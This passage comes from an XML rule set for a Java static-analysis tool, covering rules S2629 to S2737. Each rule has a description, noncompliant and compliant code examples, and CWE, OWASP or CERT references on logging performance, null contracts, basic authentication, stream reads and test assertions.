            &lt;li&gt; &lt;a href=&quot;https://www.sans.org/top25-software-errors/#cat3&quot;&gt;SANS Top 25&lt;/a&gt;
            - Porous Defenses &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>cwe</tag>
        <tag>owasp-a5</tag>
        <tag>sans-top25-porous</tag>
        <securityStandards>
            <OWASP>A5</OWASP>
        </securityStandards>
    </rule>

    <rule key='S2629' priority='MAJOR'>
        <configKey>S2629</configKey>
        <name>&quot;Preconditions&quot; and logging arguments should not require evaluation</name>
        <description>
            &lt;p&gt;Passing message arguments that require further evaluation into a Guava &lt;code&gt;com.google.common.base.Preconditions&lt;/code&gt;
            check can result in a
            performance penalty. That's because whether or not they're needed, each argument must be resolved before the
            method is actually called.&lt;/p&gt;
            &lt;p&gt;Similarly, passing concatenated strings into a logging method can also incur a needless performance
            hit because the concatenation will be performed
            every time the method is called, whether or not the log level is low enough to show the message.&lt;/p&gt;
            &lt;p&gt;Instead, you should structure your code to pass static or pre-computed values into &lt;code&gt;Preconditions&lt;/code&gt;
            conditions check and logging
            calls.&lt;/p&gt;
            &lt;p&gt;Specifically, the built-in string formatting should be used instead of string concatenation, and if
            the message is the result of a method call,
            then &lt;code&gt;Preconditions&lt;/code&gt; should be skipped altogether, and the relevant exception should
            be conditionally thrown instead.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            logger.log(Level.DEBUG, &quot;Something went wrong: &quot; + message); // Noncompliant; string concatenation
            performed even when log level too high to show DEBUG messages

            logger.fine(&quot;An exception occurred with message: &quot; + message); // Noncompliant

            LOG.error(&quot;Unable to open file &quot; + csvPath, e); // Noncompliant

            Preconditions.checkState(a &amp;gt; 0, &quot;Arg must be positive, but got &quot; + a); // Noncompliant.
            String concatenation performed even when a &amp;gt; 0

            Preconditions.checkState(condition, formatMessage()); // Noncompliant. formatMessage() invoked regardless of
            condition

            Preconditions.checkState(condition, &quot;message: %s&quot;, formatMessage()); // Noncompliant
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            logger.log(Level.SEVERE, &quot;Something went wrong: {0} &quot;, message); // String formatting only applied
            if needed

            logger.fine(&quot;An exception occurred with message: {}&quot;, message); // SLF4J, Log4j

            logger.log(Level.SEVERE, () -&amp;gt; &quot;Something went wrong: &quot; + message); // since Java 8, we can
            use Supplier , which will be evaluated lazily

            LOG.error(&quot;Unable to open file {0}&quot;, csvPath, e);

            if (LOG.isDebugEnabled() {
            LOG.debug(&quot;Unable to open file &quot; + csvPath, e); // this is compliant, because it will not evaluate
            if log level is above debug.
            }

            Preconditions.checkState(arg &amp;gt; 0, &quot;Arg must be positive, but got %d&quot;, a); // String
            formatting only applied if needed

            if (!condition) {
            throw new IllegalStateException(formatMessage()); // formatMessage() only invoked conditionally
            }

            if (!condition) {
            throw new IllegalStateException(&quot;message: &quot; + formatMessage());
            }
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;&lt;code&gt;catch&lt;/code&gt; blocks are ignored, because the performance penalty is unimportant
            on exceptional paths (catch block should not be a part of
            standard program flow). Getters are ignored as well as methods called on annotations which can be considered
            as getters. This rule accounts for
            explicit test-level testing with SLF4J methods &lt;code&gt;isXXXEnabled&lt;/code&gt; and ignores the bodies
            of such &lt;code&gt;if&lt;/code&gt; statements.&lt;/p&gt;
        </description>
        <tag>performance</tag>
    </rule>

    <rule key='S2637' priority='MINOR'>
        <configKey>S2637</configKey>
        <name>&quot;@NonNull&quot; values should not be set to null</name>
        <description>
            &lt;p&gt;Fields, parameters and return values marked &lt;code&gt;@NotNull&lt;/code&gt;, &lt;code&gt;@NonNull&lt;/code&gt;,
            or &lt;code&gt;@Nonnull&lt;/code&gt; are assumed to have non-null
            values and are not typically null-checked before use. Therefore setting one of these values to &lt;code&gt;null&lt;/code&gt;,
            or failing to set such a class field
            in a constructor, could cause &lt;code&gt;NullPointerException&lt;/code&gt;s at runtime.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class MainClass {

            @Nonnull
            private String primary;
            private String secondary;

            public MainClass(String color) {
            if (color != null) {
            secondary = null;
            }
            primary = color; // Noncompliant; &quot;primary&quot; is Nonnull but could be set to null here
            }

            public MainClass() { // Noncompliant; &quot;primary&quot; Nonnull&quot; but is not initialized
            }

            @Nonnull
            public String indirectMix() {
            String mix = null;
            return mix; // Noncompliant; return value is Nonnull, but null is returned.}}
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/476.html&quot;&gt;MITRE CWE-476&lt;/a&gt;
            - NULL Pointer Dereference &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/aDdGBQ&quot;&gt;CERT, EXP01-J.&lt;/a&gt; -
            Do not use a null in a case where an object is required &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>cwe</tag>
        <securityStandards>
            <cwe>476</cwe>
        </securityStandards>
    </rule>

    <rule key='S2638' priority='CRITICAL'>
        <configKey>S2638</configKey>
        <name>Method overrides should not change contracts</name>
        <description>
            &lt;p&gt;Because a subclass instance may be cast to and treated as an instance of the superclass, overriding
            methods should uphold the aspects of the
            superclass contract that relate to the Liskov Substitution Principle. Specifically, if the parameters or
            return type of the superclass method are
            marked with any of the following: &lt;code&gt;@Nullable&lt;/code&gt;, &lt;code&gt;@CheckForNull&lt;/code&gt;,
            &lt;code&gt;@NotNull&lt;/code&gt;, &lt;code&gt;@NonNull&lt;/code&gt;, and
            &lt;code&gt;@Nonnull&lt;/code&gt;, then subclass parameters are not allowed to tighten the contract, and
            return values are not allowed to loosen it.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class Fruit {

            private Season ripe;
            private String color;

            public void setRipe(@Nullable Season ripe) {
            this.ripe = ripe;
            }

            public @NotNull Integer getProtein() {
            return 12;
            }
            }

            public class Raspberry extends Fruit {

            public void setRipe(@NotNull Season ripe) { // Noncompliant
            this.ripe = ripe;
            }

            public @Nullable Integer getProtein() { // Noncompliant
            return null;
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://en.wikipedia.org/wiki/Liskov_substitution_principle&quot;&gt;Wikipedia -
            Liskov substitution principle&lt;/a&gt; &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>suspicious</tag>
    </rule>

    <rule key='S2639' priority='MAJOR'>
        <configKey>S2639</configKey>
        <name>Inappropriate regular expressions should not be used</name>
        <description>
            &lt;p&gt;Regular expressions are powerful but tricky, and even those long used to using them can make
            mistakes.&lt;/p&gt;
            &lt;p&gt;The following should not be used as regular expressions:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;code&gt;.&lt;/code&gt; - matches any single character. Used in &lt;code&gt;replaceAll&lt;/code&gt;,
            it matches &lt;em&gt;everything&lt;/em&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;|&lt;/code&gt; - normally used as an option delimiter. Used stand-alone, it matches
            the space between characters &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;File.separator&lt;/code&gt; - matches the platform-specific file path delimiter. On
            Windows, this will be taken as an escape character &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            String str = &quot;/File|Name.txt&quot;;

            String clean = str.replaceAll(&quot;.&quot;,&quot;&quot;); // Noncompliant; probably meant to remove only
            dot chars, but returns an empty string
            String clean2 = str.replaceAll(&quot;|&quot;,&quot;_&quot;); // Noncompliant; yields
            _/_F_i_l_e_|_N_a_m_e_._t_x_t_
            String clean3 = str.replaceAll(File.separator,&quot;&quot;); // Noncompliant; exception on Windows

            String clean4 = str.replaceFirst(&quot;.&quot;,&quot;&quot;); // Noncompliant;
            String clean5 = str.replaceFirst(&quot;|&quot;,&quot;_&quot;); // Noncompliant;
            String clean6 = str.replaceFirst(File.separator,&quot;&quot;); // Noncompliant;
            &lt;/pre&gt;
        </description>
    </rule>

    <rule key='S2647' priority='CRITICAL'>
        <configKey>S2647</configKey>
        <name>Basic authentication should not be used</name>
        <description>
            &lt;p&gt;Basic authentication's only means of obfuscation is Base64 encoding. Since Base64 encoding is
            easily recognized and reversed, it offers only the
            thinnest veil of protection to your users, and should not be used. &lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            // Using HttpPost from Apache HttpClient
            String encoding = Base64Encoder.encode (&quot;login:passwd&quot;);
            org.apache.http.client.methods.HttpPost httppost = new HttpPost(url);
            httppost.setHeader(&quot;Authorization&quot;, &quot;Basic &quot; + encoding); // Noncompliant

            or

            // Using HttpURLConnection
            String encoding = Base64.getEncoder().encodeToString((&quot;login:passwd&quot;).getBytes(‌&quot;UTF‌​-8&quot;​));
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod(&quot;POST&quot;);
            conn.setDoOutput(true);
            conn.setRequestProperty(&quot;Authorization&quot;, &quot;Basic &quot; + encoding); // Noncompliant
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure&quot;&gt;OWASP
            Top 10 2017 Category A3&lt;/a&gt; - Sensitive Data Exposure
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cheatsheetseries.owasp.org/cheatsheets/Web_Service_Security_Cheat_Sheet.html#user-authentication&quot;&gt;OWASP
            Web Service Security
            Cheat Sheet&lt;/a&gt; &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/522&quot;&gt;MITRE, CWE-522&lt;/a&gt; -
            Insufficiently Protected Credentials &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.sans.org/top25-software-errors/#cat3&quot;&gt;SANS Top 25&lt;/a&gt;
            - Porous Defenses &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cwe</tag>
        <tag>owasp-a3</tag>
        <tag>sans-top25-porous</tag>
        <securityStandards>
            <cwe>522,311</cwe>
            <OWASP>A3</OWASP>
        </securityStandards>
    </rule>

    <rule key='S2674' priority='MINOR'>
        <configKey>S2674</configKey>
        <name>The value returned from a stream read should be checked</name>
        <description>
            &lt;p&gt;You cannot assume that any given stream reading call will fill the &lt;code&gt;byte[]&lt;/code&gt;
            passed in to the method. Instead, you must check the value
            returned by the read method to see how many bytes were read. Fail to do so, and you introduce bug that is
            both harmful and difficult to reproduce.&lt;/p&gt;
            &lt;p&gt;Similarly, you cannot assume that &lt;code&gt;InputStream.skip&lt;/code&gt; will actually skip the
            requested number of bytes, but must check the value returned
            from the method.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when an &lt;code&gt;InputStream.read&lt;/code&gt; method that accepts a
            &lt;code&gt;byte[]&lt;/code&gt; is called, but the return value is not
            checked, and when the return value of &lt;code&gt;InputStream.skip&lt;/code&gt; is not checked. The rule
            also applies to &lt;code&gt;InputStream&lt;/code&gt; child
            classes.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public void doSomething(String fileName) {
            try {
            InputStream is = new InputStream(file);
            byte [] buffer = new byte[1000];
            is.read(buffer); // Noncompliant
            // ...
            } catch (IOException e) { ... }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public void doSomething(String fileName) {
            try {
            InputStream is = new InputStream(file);
            byte [] buffer = new byte[1000];
            int count = 0;
            while (count = is.read(buffer) &amp;gt; 0) {
            // ...
            }
            } catch (IOException e) { ... }
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/VzdGBQ&quot;&gt;CERT, FIO10-J.&lt;/a&gt; -
            Ensure the array is filled when using read() to fill an array &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
    </rule>

    <rule key='S2675' priority='MAJOR'>
        <configKey>S2675</configKey>
        <name>&quot;readObject&quot; should not be &quot;synchronized&quot;</name>
        <description>
            &lt;p&gt;A &lt;code&gt;readObject&lt;/code&gt; method is written when a &lt;code&gt;Serializable&lt;/code&gt;
            object needs special handling to be rehydrated from file. It should be
            the case that the object being created by &lt;code&gt;readObject&lt;/code&gt; is only visible to the thread
            that invoked the method, and the
            &lt;code&gt;synchronized&lt;/code&gt; keyword is not needed, and using &lt;code&gt;synchronized&lt;/code&gt;
            anyway is just confusing. If this is not the case, the method
            should be refactored to make it the case.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            private synchronized void readObject(java.io.ObjectInputStream in)
            throws IOException, ClassNotFoundException { // Noncompliant
            //...
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            private void readObject(java.io.ObjectInputStream in)
            throws IOException, ClassNotFoundException { // Compliant
            //...
            }
            &lt;/pre&gt;
        </description>
        <tag>confusing</tag>
    </rule>

    <rule key='S2676' priority='MINOR'>
        <configKey>S2676</configKey>
        <name>Neither &quot;Math.abs&quot; nor negation should be used on numbers that could be &quot;MIN_VALUE&quot;
        </name>
        <description>
            &lt;p&gt;It is possible for a call to &lt;code&gt;hashCode&lt;/code&gt; to return &lt;code&gt;Integer.MIN_VALUE&lt;/code&gt;.
            Take the absolute value of such a hashcode and you'll
            still have a negative number. Since your code is likely to assume that it's a positive value instead, your
            results will be unreliable.&lt;/p&gt;
            &lt;p&gt;Similarly, &lt;code&gt;Integer.MIN_VALUE&lt;/code&gt; could be returned from &lt;code&gt;Random.nextInt()&lt;/code&gt;
            or any object's &lt;code&gt;compareTo&lt;/code&gt; method, and
            &lt;code&gt;Long.MIN_VALUE&lt;/code&gt; could be returned from &lt;code&gt;Random.nextLong()&lt;/code&gt;.
            Calling &lt;code&gt;Math.abs&lt;/code&gt; on values returned from these methods
            is similarly ill-advised.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public void doSomething(String str) {
            if (Math.abs(str.hashCode()) &amp;gt; 0) { // Noncompliant
            // ...
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public void doSomething(String str) {
            if (str.hashCode() != 0) {
            // ...
            }
            }
            &lt;/pre&gt;
        </description>
    </rule>

    <rule key='S2677' priority='MAJOR'>
        <configKey>S2677</configKey>
        <name>&quot;read&quot; and &quot;readLine&quot; return values should be used</name>
        <description>
            &lt;p&gt;When a method is called that returns data read from some data source, that data should be stored
            rather than thrown away. Any other course of
            action is surely a bug.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when the return value of any of the following is ignored or merely
            null-checked: &lt;code&gt;BufferedReader.readLine()&lt;/code&gt;,
            &lt;code&gt;Reader.read()&lt;/code&gt;, and these methods in any child classes.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public void doSomethingWithFile(String fileName) {
            BufferedReader buffReader = null;
            try {
            buffReader = new BufferedReader(new FileReader(fileName));
            while (buffReader.readLine() != null) { // Noncompliant
            // ...
            }
            } catch (IOException e) {
            // ...
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public void doSomethingWithFile(String fileName) {
            BufferedReader buffReader = null;
            try {
            buffReader = new BufferedReader(new FileReader(fileName));
            String line = null;
            while ((line = buffReader.readLine()) != null) {
            // ...
            }
            } catch (IOException e) {
            // ...
            }
            }
            &lt;/pre&gt;
        </description>
    </rule>

    <rule key='S2681' priority='MAJOR'>
        <configKey>S2681</configKey>
        <name>Multiline blocks should be enclosed in curly braces</name>
        <description>
            &lt;p&gt;Curly braces can be omitted from a one-line block, such as with an &lt;code&gt;if&lt;/code&gt;
            statement or &lt;code&gt;for&lt;/code&gt; loop, but doing so can be
            misleading and induce bugs.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when the whitespacing of the lines after a one line block indicates an
            intent to include those lines in the block, but
            the omission of curly braces means the lines will be unconditionally executed once.&lt;/p&gt;
            &lt;p&gt;Note that this rule considers tab characters to be equivalent to 1 space. If you mix spaces and
            tabs you will sometimes see issues in code which
            look fine in your editor but are confusing when you change the size of tabs.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            if (condition)
            firstActionInBlock();
            secondAction(); // Noncompliant; executed unconditionally
            thirdAction();

            if (condition) firstActionInBlock(); secondAction(); // Noncompliant; secondAction executed unconditionally

            if (condition) firstActionInBlock(); // Noncompliant
            secondAction(); // Executed unconditionally

            if (condition); secondAction(); // Noncompliant; secondAction executed unconditionally

            String str = null;
            for (int i = 0; i &amp;lt; array.length; i++)
            str = array[i];
            doTheThing(str); // Noncompliant; executed only on last array element
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            if (condition) {
            firstActionInBlock();
            secondAction();
            }
            thirdAction();

            String str = null;
            for (int i = 0; i &amp;lt; array.length; i++) {
            str = array[i];
            doTheThing(str);
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/483.html&quot;&gt;MITRE, CWE-483&lt;/a&gt;
            - Incorrect Block Delimitation &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/MzZGBQ&quot;&gt;CERT, EXP52-J.&lt;/a&gt; -
            Use braces for the body of an if, for, or while statement &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>cwe</tag>
    </rule>

    <rule key='S2689' priority='BLOCKER'>
        <configKey>S2689</configKey>
        <name>Files opened in append mode should not be used with ObjectOutputStream</name>
        <description>
            &lt;p&gt;&lt;code&gt;ObjectOutputStream&lt;/code&gt;s are used with serialization, and the first thing an
            &lt;code&gt;ObjectOutputStream&lt;/code&gt; writes is the serialization
            stream header. This header should appear once per file, at the beginning. Pass a file opened in append mode
            into an &lt;code&gt;ObjectOutputStream&lt;/code&gt;
            constructor and the serialization stream header will be added to the end of the file before your object is
            then also appended.&lt;/p&gt;
            &lt;p&gt;When you're trying to read your object(s) back from the file, only the first one will be read
            successfully, and a
            &lt;code&gt;StreamCorruptedException&lt;/code&gt; will be thrown after that.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            FileOutputStream fos = new FileOutputStream (fileName , true); // fos opened in append mode
            ObjectOutputStream out = new ObjectOutputStream(fos); // Noncompliant
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            FileOutputStream fos = new FileOutputStream (fileName);
            ObjectOutputStream out = new ObjectOutputStream(fos);
            &lt;/pre&gt;
        </description>
        <tag>serialization</tag>
    </rule>

    <rule key='S2692' priority='CRITICAL'>
        <configKey>S2692</configKey>
        <name>&quot;indexOf&quot; checks should not be for positive numbers</name>
        <description>
            &lt;p&gt;Most checks against an &lt;code&gt;indexOf&lt;/code&gt; value compare it with -1 because 0 is a
            valid index. Any checks which look for values &amp;gt;0 ignore the
            first element, which is likely a bug. If the intent is merely to check inclusion of a value in a &lt;code&gt;String&lt;/code&gt;
            or a &lt;code&gt;List&lt;/code&gt;, consider
            using the &lt;code&gt;contains&lt;/code&gt; method instead.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when an &lt;code&gt;indexOf&lt;/code&gt; value retrieved either from a
            &lt;code&gt;String&lt;/code&gt; or a &lt;code&gt;List&lt;/code&gt; is tested against
            &lt;code&gt;&amp;gt;0&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            String color = &quot;blue&quot;;
            String name = &quot;ishmael&quot;;

            List&amp;lt;String&amp;gt; strings = new ArrayList&amp;lt;String&amp;gt; ();
            strings.add(color);
            strings.add(name);

            if (strings.indexOf(color) &amp;gt; 0) { // Noncompliant
            // ...
            }
            if (name.indexOf(&quot;ish&quot;) &amp;gt; 0) { // Noncompliant
            // ...
            }
            if (name.indexOf(&quot;ae&quot;) &amp;gt; 0) { // Noncompliant
            // ...
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            String color = &quot;blue&quot;;
            String name = &quot;ishmael&quot;;

            List&amp;lt;String&amp;gt; strings = new ArrayList&amp;lt;String&amp;gt; ();
            strings.add(color);
            strings.add(name);

            if (strings.indexOf(color) &amp;gt; -1) {
            // ...
            }
            if (name.indexOf(&quot;ish&quot;) &amp;gt;= 0) {
            // ...
            }
            if (name.contains(&quot;ae&quot;) {
            // ...
            }
            &lt;/pre&gt;
        </description>
        <tag>suspicious</tag>
    </rule>

    <rule key='S2695' priority='BLOCKER'>
        <configKey>S2695</configKey>
        <name>&quot;PreparedStatement&quot; and &quot;ResultSet&quot; methods should be called with valid indices</name>
        <description>
            &lt;p&gt;The parameters in a &lt;code&gt;PreparedStatement&lt;/code&gt; are numbered from 1, not 0, so using
            any &quot;set&quot; method of a &lt;code&gt;PreparedStatement&lt;/code&gt; with a
            number less than 1 is a bug, as is using an index higher than the number of parameters. Similarly, &lt;code&gt;ResultSet&lt;/code&gt;
            indices also start at 1,
            rather than 0&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            PreparedStatement ps = con.prepareStatement(&quot;SELECT fname, lname FROM employees where hireDate &amp;gt;
            ? and salary &amp;lt; ?&quot;);
            ps.setDate(0, date); // Noncompliant
            ps.setDouble(3, salary); // Noncompliant

            ResultSet rs = ps.executeQuery();
            while (rs.next()) {
            String fname = rs.getString(0); // Noncompliant
            // ...
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            PreparedStatement ps = con.prepareStatement(&quot;SELECT fname, lname FROM employees where hireDate &amp;gt;
            ? and salary &amp;lt; ?&quot;);
            ps.setDate(1, date);
            ps.setDouble(2, salary);

            ResultSet rs = ps.executeQuery();
            while (rs.next()) {
            String fname = rs.getString(1);
            // ...
            }
            &lt;/pre&gt;
        </description>
        <tag>sql</tag>
    </rule>

    <rule key='S2696' priority='CRITICAL'>
        <configKey>S2696</configKey>
        <name>Instance methods should not write to &quot;static&quot; fields</name>
        <description>
            &lt;p&gt;Correctly updating a &lt;code&gt;static&lt;/code&gt; field from a non-static method is tricky to
            get right and could easily lead to bugs if there are multiple
            class instances and/or multiple threads in play. Ideally, &lt;code&gt;static&lt;/code&gt; fields are only
            updated from &lt;code&gt;synchronized static&lt;/code&gt;
            methods.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue each time a &lt;code&gt;static&lt;/code&gt; field is updated from a
            non-static method.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class MyClass {

            private static int count = 0;

            public void doSomething() {
            //...
            count++; // Noncompliant
            }
            }
            &lt;/pre&gt;
        </description>
        <tag>multi-threading</tag>
    </rule>

    <rule key='S2699' priority='BLOCKER'>
        <configKey>S2699</configKey>
        <name>Tests should include assertions</name>
        <description>
            &lt;p&gt;A test case without assertions ensures only that no exceptions are thrown. Beyond basic
            runnability, it ensures nothing about the behavior of the
            code under test.&lt;/p&gt;
            &lt;p&gt;This rule raises an exception when no assertions from any of the following known frameworks are
            found in a test:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; AssertJ &lt;/li&gt;
            &lt;li&gt; Awaitility &lt;/li&gt;
            &lt;li&gt; EasyMock &lt;/li&gt;
            &lt;li&gt; Eclipse Vert.x &lt;/li&gt;
            &lt;li&gt; Fest 1.x and 2.x &lt;/li&gt;
            &lt;li&gt; Hamcrest &lt;/li&gt;
            &lt;li&gt; JMock &lt;/li&gt;
            &lt;li&gt; JMockit &lt;/li&gt;
            &lt;li&gt; JUnit &lt;/li&gt;
            &lt;li&gt; Mockito &lt;/li&gt;
            &lt;li&gt; Rest-assured 2.x, 3.x and 4.x &lt;/li&gt;
            &lt;li&gt; RxJava 1.x and 2.x &lt;/li&gt;
            &lt;li&gt; Selenide &lt;/li&gt;
            &lt;li&gt; Spring's &lt;code&gt;org.springframework.test.web.servlet.ResultActions.andExpect()&lt;/code&gt;
            &lt;/li&gt;
            &lt;li&gt; Truth Framework &lt;/li&gt;
            &lt;li&gt; WireMock &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;Furthermore, as new or custom assertion frameworks may be used, the rule can be parametrized to
            define specific methods that will also be
            considered as assertions. No issue will be raised when such methods are found in test cases. The parameter
            value should have the following format
            &lt;code&gt;&amp;lt;FullyQualifiedClassName&amp;gt;#&amp;lt;MethodName&amp;gt;&lt;/code&gt;, where &lt;code&gt;MethodName&lt;/code&gt;
            can end with the wildcard character. For constructors,
            the pattern should be &lt;code&gt;&amp;lt;FullyQualifiedClassName&amp;gt;#&amp;lt;init&amp;gt;&lt;/code&gt;.&lt;/p&gt;
            &lt;p&gt;Example:&amp;nbsp;&lt;code&gt;com.company.CompareToTester#compare*,com.company.CustomAssert#customAssertMethod,com.company.CheckVerifier#&amp;lt;init&amp;gt;&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            @Test
            public void testDoSomething() { // Noncompliant
            MyClass myClass = new MyClass();
            myClass.doSomething();
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;p&gt;Example when &lt;code&gt;com.company.CompareToTester#compare*&lt;/code&gt; is used as parameter to
            the rule.&lt;/p&gt;
            &lt;pre&gt;
            import com.company.CompareToTester;

            @Test
            public void testDoSomething() {
            MyClass myClass = new MyClass();
            assertNull(myClass.doSomething()); // JUnit assertion
            assertThat(myClass.doSomething()).isNull(); // Fest assertion
            }

            @Test
            public void testDoSomethingElse() {
            MyClass myClass = new MyClass();
            new CompareToTester().compareWith(myClass); // Compliant - custom assertion method defined as rule parameter
            CompareToTester.compareStatic(myClass); // Compliant
            }
            &lt;/pre&gt;
        </description>
        <tag>junit</tag>
        <tag>tests</tag>
        <param>
            <key>customAssertionMethods</key>
            <htmlDesc>Comma-separated list of fully qualified method symbols that should be considered as assertion
                methods. The wildcard character can be used at the end of the method name.
            </htmlDesc>
            <type>STRING</type>
        </param>
    </rule>

    <rule key='S2718' priority='MAJOR'>
        <configKey>S2718</configKey>
        <name>&quot;DateUtils.truncate&quot; from Apache Commons Lang library should not be used</name>
        <description>
            &lt;p&gt;The use of the &lt;code&gt;ZonedDateTime&lt;/code&gt; class introduced in Java 8 to truncate a date
            can be significantly faster than the &lt;code&gt;DateUtils&lt;/code&gt;
            class from Commons Lang.&lt;/p&gt;
            &lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt; that this rule is automatically disabled when the project's &lt;code&gt;sonar.java.source&lt;/code&gt;
            is lower than &lt;code&gt;8&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public Date trunc(Date date) {
            return DateUtils.truncate(date, Calendar.SECOND); // Noncompliant
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public Date trunc(Date date) {
            Instant instant = date.toInstant();
            ZonedDateTime zonedDateTime = instant.atZone(ZoneId.systemDefault());
            ZonedDateTime truncatedZonedDateTime = zonedDateTime.truncatedTo(ChronoUnit.SECONDS);
            Instant truncatedInstant = truncatedZonedDateTime.toInstant();
            return Date.from(truncatedInstant);
            }
            &lt;/pre&gt;
        </description>
        <tag>java8</tag>
        <tag>performance</tag>
    </rule>

    <rule key='S2737' priority='MINOR'>
        <configKey>S2737</configKey>
        <name>&quot;catch&quot; clauses should do more than rethrow</name>
        <description>
            &lt;p&gt;A &lt;code&gt;catch&lt;/code&gt; clause that only rethrows the caught exception has the same effect
            as omitting the &lt;code&gt;catch&lt;/code&gt; altogether and letting
            it bubble up automatically, but with more code and the additional detriment of leaving maintainers
            scratching their heads. &lt;/p&gt;
            &lt;p&gt;Such clauses should either be eliminated or populated with the appropriate logic.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public String readFile(File f) {
            StringBuilder sb = new StringBuilder();
            try {
            FileReader fileReader = new FileReader(fileName);
            BufferedReader bufferedReader = new BufferedReader(fileReader);

            while((line = bufferedReader.readLine()) != null) {
            //...
            }
            catch (IOException e) { // Noncompliant
            throw e;
            }
            return sb.toString();
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public String readFile(File f) {
            StringBuilder sb = new StringBuilder();
            try {
            FileReader fileReader = new FileReader(fileName);
            BufferedReader bufferedReader = new BufferedReader(fileReader);

            while((line = bufferedReader.readLine()) != null) {
            //...
            }
